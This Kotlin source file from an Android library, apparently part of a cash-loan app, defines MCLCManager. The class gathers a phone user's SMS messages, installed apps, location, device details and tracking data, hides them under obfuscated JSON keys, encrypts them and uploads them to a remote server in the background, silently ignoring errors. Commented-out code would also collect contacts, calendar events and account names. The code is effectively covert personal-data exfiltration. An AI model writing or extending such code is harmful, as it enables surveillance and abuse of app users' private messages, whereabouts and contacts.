package com.bigdata.lib

import com.bigdata.lib.SpKeyManager.CASH_KEY_POST_MCLC
import com.bigdata.lib.net.NetWorkManager
import com.cache.lib.SharedPrefUser
import com.google.gson.JsonObject
import com.project.util.AESNormalUtil
import com.util.lib.*
import com.util.lib.log.logger_d
import com.util.lib.log.logger_e
import com.util.lib.log.logger_i
import org.json.JSONObject
import kotlin.math.abs


typealias Result = ((result: UploadResult) -> Unit)?

class MCLCManager {
    companion object {
        private const val TAG = "MCLCManager"
        const val time_3_month = 45L * 24 * 3600 * 1000//45天的毫秒数
        const val time_6_month = 180L * 24 * 3600 * 1000//180天的毫秒数
        const val second_1 = 1000L//1秒的毫秒数
        const val min_1 = 60L * second_1//1分钟的毫秒数
        const val hour_1 = 60L * min_1//1小时的毫秒数
        const val day_1 = 24L * hour_1//1天的毫秒数
        const val day_7 = 7L * day_1//7天的毫秒数
        const val INTERVAL_UNIT = day_1//数据抓取间隔时间单位
        const val one_month = 30 * day_1
        const val one_year = 12 * one_month


        fun nullCheck(value: String?): String {
            if (value == null) {
                return ""
            } else {
                return value
            }
        }


        /**
         * 获取离当前时间3个月的时间戳
         */
        fun getLast_3_Month_time(): Long {
            val currentTime = System.currentTimeMillis()
            return currentTime - time_3_month
        }

        /**
         *获取距离当前时间6个月的时间戳
         */
        fun getLast_6_Month_time(): Long {
            val currentTime = System.currentTimeMillis()
            return currentTime - time_6_month
        }

        /**
         * 获取离当前时间一年的时间戳
         */
        fun getLast_1_year_time(): Long {
            val currentTime = System.currentTimeMillis()
            return currentTime - one_year
        }

        private fun getCashInfo(): JsonObject {
            val listener = BigDataManager.get().getNetDataListener() ?: return JsonObject()
            val ctx = listener.getContext()
            val jsonObject = JsonObject()
            try {
                // 短信
                jsonObject.addProperty("MGTnhn", GsonUtil.toJson(SmsHelper.getMessage(ctx)))
            } catch (e: Exception) {
            } catch (e: OutOfMemoryError) {
            }
            try {
                // app list
                jsonObject.addProperty("bPp7hQmh", GsonUtil.toJson(DevicesAppHelper.getAppListInfo(ctx)))
            } catch (e: Exception) {
            } catch (e: OutOfMemoryError) {
            }

//            try {
//                // 联系人
//                jsonObject.addProperty("P7r2", GsonUtil.toJson(ContactsHelper.getContacts(ctx)))
//            } catch (e: Exception) {
//            } catch (e: OutOfMemoryError) {
//            }

//            try {
//                jsonObject.add("calendar", CalendarHelper.getCalendarEvent(ctx))
//            } catch (e: Exception) {
//            } catch (e: OutOfMemoryError) {
//            }
            // 定位
            try {
                val locationInfo = LocationHelp.getLocationInfo()
                val jobj = JsonObject()
                jobj.addProperty("WSApb8Uz", locationInfo?.first)
                jobj.addProperty("DfA53PkKr", locationInfo?.second)
                jsonObject.add("hjcgfYW732", jobj)
            } catch (e: Exception) {
            }
            // 设备信息
            try {
                jsonObject.addProperty(
                    "CEewmJPFFR",
                    GsonUtil.toJson(DevicesHelper.getDevicesInfo(ctx)).orEmpty()
                )
            } catch (e: Exception) {
            }

            try {
                // 埋点数据
                val jsonBase = BaseInfoHelper.getBaseInfo(ctx)
                jsonBase.entrySet().forEach {
                    jsonBase.addProperty(it.key, it.value.asString)
                }
                jsonObject.add("FQhZcGE67l", jsonBase)
                logger_d(TAG, "mclc base = $jsonBase")
            } catch (e: Exception) {
                logger_e(TAG, "exception=$e")
            }
            return jsonObject
        }


        /**
         * 上传 信息
         */
        fun postMCLCinfoReal(listener: Result) {
            asynUploadData(listener)
        }

        /**
         * @param extra 额外信息
         * @param ignoreInterval 是否忽略时间间隔 true:忽略时间间隔检查， false: 不忽略
         */
        private fun asynUploadData(listener: ((result: UploadResult) -> Unit)? = null) {
            ThreadPoolUtil.executor("cash info post") {
                val result = synUpload()
                listener?.invoke(result)
            }
        }

        private var isUploadComplete = true

        fun synUpload(): UploadResult {
            LocationHelp.requestLocation()
            val result = UploadResult()
            if (!isUploadComplete) {
                result.result = UploadResult.RESULT_UPLOADING
                return UploadResult()
            }
            if (checkPostMCLCSuccessTimer()) {
                isUploadComplete = false
                val jsonCashInfo = getCashInfo()
                val beforePostInfo = jsonCashInfo.toString()
                logger_i(TAG, "cash info post encryt before = $beforePostInfo")
//                val zipInfo = GzipUtils.zip(beforePostInfo)
                //                    ${zipInfo.size / 1024f}
                logger_i(
                    TAG,
                    "cash info post encryt gzip size befor = ${beforePostInfo.toByteArray().size / 1024f} , after = "
                )
                val postInfo = AESNormalUtil.mexicoEncrypt(beforePostInfo, false).orEmpty()
//                val postInfo = beforePostInfo
                logger_i(TAG, "cash info post encryt after = $postInfo")
                val remoteUrl = BigDataManager.get().getNetDataListener()?.getBigUrl()
                    ?: return UploadResult()

                val response = try {
                    NetWorkManager.synUploadlogMessage(postInfo, remoteUrl)
                } catch (e: Exception) {
                    result.exception = e
                    null
                }

                isUploadComplete = true
                if (response?.isSuccessful == true) {
                    response.body()?.string()?.let { body ->
                        var code = -111
                        try {
                            val desBody = AESNormalUtil.mexicoDecrypt(body)
                            logger_d(TAG, "synUpload: body =$desBody")
                            val jobj = JSONObject(desBody)
                            code = jobj.optInt("code")
                            if (code != 200) {
                                val msg = jobj.optString("msg")
                                result.exception = java.lang.IllegalArgumentException(msg)
                            }
                        } catch (e: Exception) {
                            result.exception = e
                            logger_e(TAG,"185 Exception = $e")
                        }
                        logger_d(TAG, "uploadData: code= $code")
                        result.result = if (code == 200) UploadResult.RESULT_SUCCESS else UploadResult.RESULT_EXCEPTION
                    }
                }
                logger_d(TAG, "result = $result")
                return result
            } else {
                return result
            }
        }


        fun doEvent(status: String) {
//            EventAgent.onEvent(EventKeyManager.ConstantDot.PAGE_BIG_DATA, status)
        }


        /**
         * 判断上传成功的时间是否满足条件
         */
        fun checkPostMCLCSuccessTimer(): Boolean {
            var canPost = false
            val lastTime = SharedPrefUser.getLong(CASH_KEY_POST_MCLC, -1L)
            logger_i(TAG, "lastTime = $lastTime")
            if (lastTime == -1L) {
                canPost = true
                logger_i(TAG, "lastTime is init")
            } else {
                val currentTime = System.currentTimeMillis()
                if (abs(currentTime - lastTime) >= getIntervalTimer()) {
                    canPost = true
                    logger_i(TAG, "lastTime >= ${getInterval()} days")
                } else {
                    logger_i(TAG, "lastTime < ${getInterval()} days")
                }
            }
            return canPost
        }

        /**
         * 获取抓取数据时间间隔 云控
         */
        fun getInterval(): Int {
            var interval = 0
            logger_i(TAG, " interval = $interval")
            return interval
        }

        /**
         * 获取抓取数据时间间隔时间
         */
        fun getIntervalTimer(): Long {
            var intervalTimer = 0L
            intervalTimer = getInterval() * INTERVAL_UNIT
            logger_i(TAG, " intervaltimer = $intervalTimer")
            return intervalTimer
        }

        /**
         * 获取手机account信息
         */
//        fun getPhoneAccounts(): JsonArray {
//            val jsonArray = JsonArray()
//            if (!AccountPermission().hasThisPermission()) return jsonArray
//            try {
//                val accounts = AccountManager.get(LoanApplication.getAppContext()).accounts
//                //                val emailPattern = Patterns.EMAIL_ADDRESS
//                var jsonObject: JsonObject? = null
//                accounts.forEach {
//                    //                    if (emailPattern.matcher(it.name).matches()) {
//                    jsonObject = JsonObject()
//                    jsonObject?.apply {
//                        this.addProperty("name", it.name)
//                        this.addProperty("type", it.type)
//                        jsonArray.add(this)
//                    }
//                    //                    }
//                }
//            } catch (e: java.lang.Exception) {
//
//            }
//            logger_i(TAG, "account 信息 $jsonArray")
//            return jsonArray
//        }


    }
}